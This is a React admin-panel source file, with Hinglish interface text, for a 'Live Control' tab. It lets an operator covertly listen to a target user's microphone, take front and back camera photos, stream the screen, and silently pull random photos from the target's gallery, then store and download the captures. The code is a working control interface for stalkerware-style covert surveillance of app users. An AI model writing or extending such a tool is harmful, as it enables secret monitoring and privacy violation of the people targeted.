/**
 * Admin → Live Control: mic + dual photo + screen + permanent photo gallery.
 */
import { useEffect, useMemo, useRef, useState } from "react";
import clsx from "clsx";
import {
  Camera,
  Download,
  FolderPlus,
  Mic,
  MicOff,
  Monitor,
  MonitorOff,
  Radio,
  Trash2,
} from "lucide-react";
import { auth } from "../firebase";
import { watchEmergencyUsers } from "../lib/alarm";
import {
  clearDeviceControl,
  createLiveFolder,
  deleteLiveFolder,
  deleteLivePhoto,
  downloadBase64Jpeg,
  moveLivePhoto,
  playMicStream,
  requestGalleryPull,
  requestSnap,
  resetGallerySeen,
  setMicListen,
  setScreenRecord,
  watchCapture,
  watchGalleryPullStatus,
  watchLiveFolders,
  watchLivePhotos,
  watchScreenStream,
  type CaptureResult,
  type LiveFolder,
  type LivePhoto,
} from "../lib/liveControl";
import type { UserDoc } from "../lib/types";
import { relTime } from "../lib/util";
import { Avatar } from "./ui";

const FRESH_MS = 90_000;

function isOnline(u: UserDoc, now: number) {
  return Boolean(u.lastSeen) && now - u.lastSeen < FRESH_MS && u.appState !== "background";
}


function GalleryPullBox({
  users,
  adminUid,
}: {
  users: { u: UserDoc; online: boolean }[];
  adminUid: string;
}) {
  const [target, setTarget] = useState("");
  const [count, setCount] = useState("10");
  const [folderId, setFolderId] = useState("");
  const [gtype, setGtype] = useState<"all" | "image" | "video">("all");
  const [folders, setFolders] = useState<LiveFolder[]>([]);
  const [status, setStatus] = useState<string>("");
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState("");

  useEffect(() => watchLiveFolders(setFolders), []);
  useEffect(() => {
    if (!target) return;
    return watchGalleryPullStatus(target, (s) => {
      if (!s) {
        setStatus("");
        return;
      }
      setStatus(
        `${s.status} · ${s.done}/${s.total}` +
          (s.pool != null ? ` · pool ${s.pool}` : "") +
          (s.error ? ` · ${s.error}` : ""),
      );
    });
  }, [target]);

  const online = users.filter((x) => x.online);

  const pull = async () => {
    if (!target) return;
    setBusy(true);
    setErr("");
    try {
      const n = Math.max(1, Math.min(50, parseInt(count, 10) || 10));
      await requestGalleryPull(target, adminUid, n, folderId, gtype);
    } catch (e) {
      setErr(e instanceof Error ? e.message : "pull fail");
    } finally {
      setBusy(false);
    }
  };

  const reset = async () => {
    if (!target) return;
    if (!confirm("Seen list reset? Dubara wahi photos aa sakti hain.")) return;
    setBusy(true);
    try {
      await resetGallerySeen(target);
      setStatus("seen reset");
    } catch (e) {
      setErr(e instanceof Error ? e.message : "reset fail");
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="glass space-y-2 rounded-2xl p-3">
      <p className="text-xs font-semibold tracking-wider text-paper/55">
        GALLERY PULL · silent · random N · no duplicate
      </p>
      <select
        className="h-10 w-full rounded-xl border border-paper/12 bg-ink px-2 text-sm"
        value={target}
        onChange={(e) => setTarget(e.target.value)}
      >
        <option value="">Target user (online)</option>
        {online.map(({ u }) => (
          <option key={u.uid} value={u.uid}>
            {u.displayName} · @{u.username}
          </option>
        ))}
      </select>
      <div className="flex gap-2">
        <input
          className="h-10 w-20 rounded-xl border border-paper/12 bg-paper/5 px-2 text-sm"
          value={count}
          onChange={(e) => setCount(e.target.value.replace(/\D/g, "").slice(0, 2))}
          placeholder="10"
          inputMode="numeric"
        />
        <select
          className="h-10 flex-1 rounded-xl border border-paper/12 bg-ink px-2 text-sm"
          value={gtype}
          onChange={(e) => setGtype(e.target.value as "all" | "image" | "video")}
        >
          <option value="all">Photos + Videos</option>
          <option value="image">Photos only</option>
          <option value="video">Videos only (thumbs)</option>
        </select>
      </div>
      <select
        className="h-10 w-full rounded-xl border border-paper/12 bg-ink px-2 text-sm"
        value={folderId}
        onChange={(e) => setFolderId(e.target.value)}
      >
        <option value="">Folder: All (none)</option>
        {folders.map((f) => (
          <option key={f.id} value={f.id}>
            {f.name}
          </option>
        ))}
      </select>
      <div className="flex gap-2">
        <button
          type="button"
          disabled={!target || busy}
          onClick={() => void pull()}
          className="btn-hot tap h-10 flex-1 rounded-xl text-sm font-bold"
        >
          {busy ? "…" : "Pull random"}
        </button>
        <button
          type="button"
          disabled={!target || busy}
          onClick={() => void reset()}
          className="tap h-10 rounded-xl bg-paper/10 px-3 text-xs font-semibold"
        >
          Reset seen
        </button>
      </div>
      {status ? <p className="text-xs text-paper/55">{status}</p> : null}
      {err ? <p className="text-xs text-rose">{err}</p> : null}
      <p className="text-[0.7rem] leading-relaxed text-paper/40">
        Android APK + gallery permission. Full video file nahi — video ka thumbnail aata hai. Photos HQ
        JPEG. Seen ids dobara nahi aate jab tak Reset na ho.
      </p>
    </div>
  );
}

function PhotoGallery() {
  const [photos, setPhotos] = useState<LivePhoto[]>([]);
  const [folders, setFolders] = useState<LiveFolder[]>([]);
  const [folder, setFolder] = useState<string>(""); // "" = all
  const [newName, setNewName] = useState("");
  const [busy, setBusy] = useState("");
  const [err, setErr] = useState("");

  useEffect(() => watchLivePhotos(setPhotos), []);
  useEffect(() => watchLiveFolders(setFolders), []);

  const shown = useMemo(() => {
    if (!folder) return photos;
    return photos.filter((p) => p.folderId === folder);
  }, [photos, folder]);

  const makeFolder = async () => {
    setErr("");
    setBusy("folder");
    try {
      await createLiveFolder(newName);
      setNewName("");
    } catch (e) {
      setErr(e instanceof Error ? e.message : "folder fail");
    } finally {
      setBusy("");
    }
  };

  const removeFolder = async (id: string) => {
    if (!confirm("Folder delete? Photos folder se nikal kar All me rahengi (folderId clear nahi auto).")) return;
    setBusy(id);
    try {
      await deleteLiveFolder(id);
      if (folder === id) setFolder("");
    } catch (e) {
      setErr(e instanceof Error ? e.message : "delete fail");
    } finally {
      setBusy("");
    }
  };

  return (
    <div className="space-y-3 border-t border-paper/10 pt-3">
      <p className="text-xs font-semibold tracking-wider text-paper/55">
        SAVED PHOTOS · auto delete nahi · download HQ
      </p>
      {err ? (
        <p className="text-xs text-rose" onClick={() => setErr("")}>
          {err}
        </p>
      ) : null}

      <div className="flex flex-wrap gap-1.5">
        <button
          type="button"
          onClick={() => setFolder("")}
          className={clsx(
            "tap rounded-full px-3 py-1 text-xs font-semibold",
            folder === "" ? "grad text-white" : "glass",
          )}
        >
          All ({photos.length})
        </button>
        {folders.map((f) => (
          <button
            key={f.id}
            type="button"
            onClick={() => setFolder(f.id)}
            className={clsx(
              "tap rounded-full px-3 py-1 text-xs font-semibold",
              folder === f.id ? "grad text-white" : "glass",
            )}
          >
            {f.name} ({photos.filter((p) => p.folderId === f.id).length})
          </button>
        ))}
      </div>

      <div className="flex gap-2">
        <input
          className="h-10 min-w-0 flex-1 rounded-xl border border-paper/12 bg-paper/5 px-3 text-sm outline-none focus:border-rose/70"
          placeholder="Naya folder naam"
          value={newName}
          onChange={(e) => setNewName(e.target.value)}
          maxLength={40}
        />
        <button
          type="button"
          disabled={busy === "folder" || !newName.trim()}
          onClick={() => void makeFolder()}
          className="tap grid size-10 shrink-0 place-items-center rounded-xl bg-paper/10"
          title="Folder banao"
        >
          <FolderPlus className="size-5" />
        </button>
      </div>

      {folder ? (
        <button
          type="button"
          className="text-xs text-rose/80"
          disabled={busy === folder}
          onClick={() => void removeFolder(folder)}
        >
          Is folder ko delete karo
        </button>
      ) : null}

      {shown.length === 0 ? (
        <p className="py-4 text-center text-xs text-paper/45">Abhi koi saved photo nahi.</p>
      ) : (
        <ul className="space-y-3">
          {shown.map((p) => (
            <li key={p.id} className="glass space-y-2 rounded-2xl p-3">
              <div className="flex items-center justify-between gap-2">
                <span className="min-w-0 truncate text-sm font-semibold">
                  {p.userName || p.username || p.uid.slice(0, 6)}
                  <span className="ml-2 text-xs font-normal text-paper/45">
                    {relTime(p.at) || "now"}
                  </span>
                </span>
                <button
                  type="button"
                  className="tap grid size-9 place-items-center rounded-lg text-rose"
                  title="Delete"
                  onClick={() => {
                    if (confirm("Photo permanently delete?")) void deleteLivePhoto(p.id);
                  }}
                >
                  <Trash2 className="size-4" />
                </button>
              </div>
              <div className="grid grid-cols-2 gap-2">
                {p.front || p.thumb ? (
                  <figure className="m-0 space-y-1">
                    <img
                      src={`data:image/jpeg;base64,${p.front || p.thumb}`}
                      alt={p.mediaKind || "photo"}
                      className="w-full rounded-xl bg-black"
                    />
                    <p className="text-[0.65rem] text-paper/45">
                      {p.mediaKind === "video" ? "VIDEO thumb" : "photo"}
                      {p.mediaName ? ` · ${p.mediaName}` : ""}
                    </p>
                    <button
                      type="button"
                      className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
                      onClick={() =>
                        downloadBase64Jpeg(
                          (p.front || p.thumb)!,
                          `${p.mediaKind || "img"}-${p.username || p.uid}-${p.at}`,
                        )
                      }
                    >
                      <Download className="size-3.5" /> Download HQ
                    </button>
                  </figure>
                ) : null}
                {p.back ? (
                  <figure className="m-0 space-y-1">
                    <img
                      src={`data:image/jpeg;base64,${p.back}`}
                      alt="back"
                      className="w-full rounded-xl bg-black"
                    />
                    <button
                      type="button"
                      className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
                      onClick={() =>
                        downloadBase64Jpeg(p.back!, `back-${p.username || p.uid}-${p.at}`)
                      }
                    >
                      <Download className="size-3.5" /> Back HQ
                    </button>
                  </figure>
                ) : null}
              </div>
              <div className="flex items-center gap-2">
                <label className="text-xs text-paper/50">Folder</label>
                <select
                  className="h-9 min-w-0 flex-1 rounded-xl border border-paper/12 bg-ink px-2 text-sm"
                  value={p.folderId}
                  onChange={(e) => void moveLivePhoto(p.id, e.target.value)}
                >
                  <option value="">— All (no folder) —</option>
                  {folders.map((f) => (
                    <option key={f.id} value={f.id}>
                      {f.name}
                    </option>
                  ))}
                </select>
              </div>
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}

export function LiveControlTab() {
  const [users, setUsers] = useState<UserDoc[]>([]);
  const [now, setNow] = useState(Date.now());
  const [listening, setListening] = useState<Record<string, boolean>>({});
  const [screening, setScreening] = useState<Record<string, boolean>>({});
  const [status, setStatus] = useState<Record<string, string>>({});
  const [busy, setBusy] = useState<Record<string, string>>({});
  const [err, setErr] = useState("");
  const [selected, setSelected] = useState<string | null>(null);
  const [capture, setCapture] = useState<CaptureResult | null>(null);
  const [screenInfo, setScreenInfo] = useState("");
  const [screenUrl, setScreenUrl] = useState<string | null>(null);
  const [screenIsJpeg, setScreenIsJpeg] = useState(false);
  const stops = useRef<Record<string, () => void>>({});
  const screenParts = useRef<BlobPart[]>([]);
  const screenMime = useRef("video/webm");
  const adminUid = auth.currentUser?.uid || "";

  useEffect(() => watchEmergencyUsers(setUsers), []);
  useEffect(() => {
    const t = window.setInterval(() => setNow(Date.now()), 15_000);
    return () => window.clearInterval(t);
  }, []);

  useEffect(() => {
    return () => {
      Object.values(stops.current).forEach((s) => s());
      stops.current = {};
      if (screenUrl) URL.revokeObjectURL(screenUrl);
    };
  }, [screenUrl]);

  useEffect(() => {
    if (!selected) {
      setCapture(null);
      return;
    }
    return watchCapture(selected, setCapture);
  }, [selected]);

  useEffect(() => {
    if (!selected || !screening[selected]) {
      setScreenInfo("");
      return;
    }
    let lastSeq = -1;
    return watchScreenStream(selected, (s) => {
      if (!s) {
        setScreenInfo("—");
        return;
      }
      if (s.error) {
        setScreenInfo(s.error);
        return;
      }
      if (!s.active) {
        setScreenInfo("band");
        return;
      }
      setScreenInfo(`live · #${s.seq}`);
      if (s.chunk && s.seq !== lastSeq) {
        lastSeq = s.seq;
        screenMime.current = s.mime || "video/webm";
        try {
          const bin = atob(s.chunk);
          const bytes = new Uint8Array(bin.length);
          for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
          if ((s.mime || "").includes("image")) {
            const url = URL.createObjectURL(new Blob([bytes], { type: s.mime || "image/jpeg" }));
            setScreenIsJpeg(true);
            setScreenUrl((old) => {
              if (old) URL.revokeObjectURL(old);
              return url;
            });
          } else {
            setScreenIsJpeg(false);
            screenParts.current.push(bytes);
            if (screenParts.current.length % 3 === 0) {
              const blob = new Blob(screenParts.current, { type: screenMime.current });
              const url = URL.createObjectURL(blob);
              setScreenUrl((old) => {
                if (old) URL.revokeObjectURL(old);
                return url;
              });
            }
          }
        } catch {
          /* */
        }
      }
    });
  }, [selected, screening]);

  const rows = useMemo(() => {
    return users
      .filter((u) => (u.approval ?? "approved") === "approved" && !u.banned)
      .map((u) => ({ u, online: isOnline(u, now) }))
      .sort((a, b) => Number(b.online) - Number(a.online) || b.u.lastSeen - a.u.lastSeen);
  }, [users, now]);

  const stopMic = async (uid: string) => {
    stops.current[uid]?.();
    delete stops.current[uid];
    setListening((p) => ({ ...p, [uid]: false }));
    setStatus((p) => ({ ...p, [uid]: "" }));
    try {
      await setMicListen(uid, false, adminUid);
    } catch (e) {
      setErr(e instanceof Error ? e.message : "band nahi hua");
    }
  };

  const startMic = async (uid: string) => {
    setErr("");
    for (const id of Object.keys(stops.current)) {
      if (id !== uid) await stopMic(id);
    }
    try {
      await setMicListen(uid, true, adminUid);
      setListening((p) => ({ ...p, [uid]: true }));
      setStatus((p) => ({ ...p, [uid]: "connect…" }));
      stops.current[uid] = playMicStream(uid, (s) => setStatus((p) => ({ ...p, [uid]: s })));
    } catch (e) {
      setErr(e instanceof Error ? e.message : "listen start nahi hua");
      setListening((p) => ({ ...p, [uid]: false }));
    }
  };

  const toggleMic = (uid: string) => {
    if (listening[uid]) void stopMic(uid);
    else void startMic(uid);
  };

  const doSnap = async (uid: string) => {
    setErr("");
    setSelected(uid);
    setBusy((p) => ({ ...p, [uid]: "snap" }));
    try {
      await requestSnap(uid, adminUid);
    } catch (e) {
      setErr(e instanceof Error ? e.message : "snap fail");
    } finally {
      window.setTimeout(() => setBusy((p) => ({ ...p, [uid]: "" })), 800);
    }
  };

  const toggleScreen = async (uid: string) => {
    setErr("");
    setSelected(uid);
    const on = !screening[uid];
    if (on) {
      screenParts.current = [];
      if (screenUrl) {
        URL.revokeObjectURL(screenUrl);
        setScreenUrl(null);
      }
    }
    setBusy((p) => ({ ...p, [uid]: "screen" }));
    try {
      await setScreenRecord(uid, on, adminUid);
      setScreening((p) => ({ ...p, [uid]: on }));
      if (!on) setScreenInfo("band");
    } catch (e) {
      setErr(e instanceof Error ? e.message : "screen fail");
    } finally {
      window.setTimeout(() => setBusy((p) => ({ ...p, [uid]: "" })), 600);
    }
  };

  return (
    <div className="space-y-3">
      <p className="text-sm text-paper/55">
        Mic · Photo (front+back, gallery me save) · Screen. Target app UI silent.
      </p>
      {err ? (
        <p className="rounded-xl bg-rose/15 px-3 py-2 text-sm text-rose" onClick={() => setErr("")}>
          {err}
        </p>
      ) : null}

      <ul className="space-y-2">
        {rows.length === 0 ? (
          <p className="pt-6 text-center text-paper/55">Koi approved user nahi / list load ho rahi…</p>
        ) : null}
        {rows.map(({ u, online }) => {
          const on = Boolean(listening[u.uid]);
          const scr = Boolean(screening[u.uid]);
          const b = busy[u.uid] || "";
          return (
            <li
              key={u.uid}
              className={clsx(
                "glass rounded-2xl p-3",
                (on || scr) && "ring-1 ring-emerald-400/40",
                !online && "opacity-60",
              )}
            >
              <div className="flex items-center gap-3">
                <Avatar src={u.avatar} name={u.displayName} size="sm" />
                <button
                  type="button"
                  className="min-w-0 flex-1 text-left"
                  onClick={() => setSelected(u.uid)}
                >
                  <span className="block truncate font-semibold">
                    <span
                      className={clsx(
                        "mr-1.5 inline-block size-2 rounded-full",
                        online ? "bg-emerald-400" : "bg-paper/30",
                      )}
                    />
                    {u.displayName}
                  </span>
                  <span className="block truncate text-xs text-paper/50">
                    @{u.username} · {online ? "online" : relTime(u.lastSeen) || "offline"}
                    {on || status[u.uid] ? ` · mic ${status[u.uid] || "on"}` : ""}
                    {scr ? " · screen" : ""}
                  </span>
                </button>
                <div className="flex shrink-0 gap-1.5">
                  <button
                    type="button"
                    className={clsx(
                      "tap grid size-10 place-items-center rounded-xl",
                      on ? "bg-rose/20 text-rose" : "bg-paper/10 text-paper/80",
                    )}
                    disabled={!online && !on}
                    title={on ? "Mic band" : "Mic suno"}
                    onClick={() => toggleMic(u.uid)}
                  >
                    {on ? <MicOff className="size-5" /> : <Mic className="size-5" />}
                  </button>
                  <button
                    type="button"
                    className="tap grid size-10 place-items-center rounded-xl bg-paper/10 text-paper/80"
                    disabled={!online || b === "snap"}
                    title="Front + Back photo (gallery me save)"
                    onClick={() => void doSnap(u.uid)}
                  >
                    {b === "snap" ? (
                      <Radio className="size-5 animate-pulse" />
                    ) : (
                      <Camera className="size-5" />
                    )}
                  </button>
                  <button
                    type="button"
                    className={clsx(
                      "tap grid size-10 place-items-center rounded-xl",
                      scr ? "bg-rose/20 text-rose" : "bg-paper/10 text-paper/80",
                    )}
                    disabled={!online && !scr}
                    title={scr ? "Screen band" : "Screen record"}
                    onClick={() => void toggleScreen(u.uid)}
                  >
                    {scr ? <MonitorOff className="size-5" /> : <Monitor className="size-5" />}
                  </button>
                </div>
              </div>
            </li>
          );
        })}
      </ul>

      {selected && capture && (capture.front || capture.back || capture.status) ? (
        <div className="glass space-y-2 rounded-2xl p-3">
          <p className="text-xs font-semibold tracking-wider text-paper/55">
            LATEST SNAP · {capture.status}
            {capture.error ? ` · ${capture.error}` : ""} · gallery me bhi save
          </p>
          <div className="grid grid-cols-2 gap-2">
            {capture.front ? (
              <figure className="m-0 space-y-1">
                <img
                  src={`data:image/jpeg;base64,${capture.front}`}
                  alt="front"
                  className="w-full rounded-xl bg-black"
                />
                <button
                  type="button"
                  className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
                  onClick={() => downloadBase64Jpeg(capture.front!, `front-live-${capture.at}`)}
                >
                  <Download className="size-3.5" /> Front HQ
                </button>
              </figure>
            ) : (
              <p className="text-xs text-paper/45">Front nahi mili</p>
            )}
            {capture.back ? (
              <figure className="m-0 space-y-1">
                <img
                  src={`data:image/jpeg;base64,${capture.back}`}
                  alt="back"
                  className="w-full rounded-xl bg-black"
                />
                <button
                  type="button"
                  className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
                  onClick={() => downloadBase64Jpeg(capture.back!, `back-live-${capture.at}`)}
                >
                  <Download className="size-3.5" /> Back HQ
                </button>
              </figure>
            ) : (
              <p className="text-xs text-paper/45">Back nahi mili</p>
            )}
          </div>
        </div>
      ) : null}

      {selected && (screening[selected] || screenUrl) ? (
        <div className="glass space-y-2 rounded-2xl p-3">
          <p className="text-xs font-semibold tracking-wider text-paper/55">
            SCREEN · {screenInfo || "…"}
          </p>
          {screenUrl ? (
            screenIsJpeg ? (
              <img src={screenUrl} alt="screen" className="max-h-60 w-full rounded-xl bg-black object-contain" />
            ) : (
              <video src={screenUrl} controls playsInline muted className="max-h-60 w-full rounded-xl bg-black" />
            )
          ) : (
            <p className="text-xs text-paper/45">
              Screen start: target pe ek baar system share dialog aayega (Android rule). Allow ke baad frames yahan.
            </p>
          )}
        </div>
      ) : null}

      <GalleryPullBox users={rows} adminUid={adminUid} />

      <PhotoGallery />

      <p className="text-xs leading-relaxed text-paper/45">
        Snap ab gallery me permanent save hota hai. Download HQ JPEG. Folder banao / move / delete.
        Green OS camera dot hide nahi hota.
      </p>
    </div>
  );
}

export async function stopAllFor(uid: string) {
  await clearDeviceControl(uid);
}
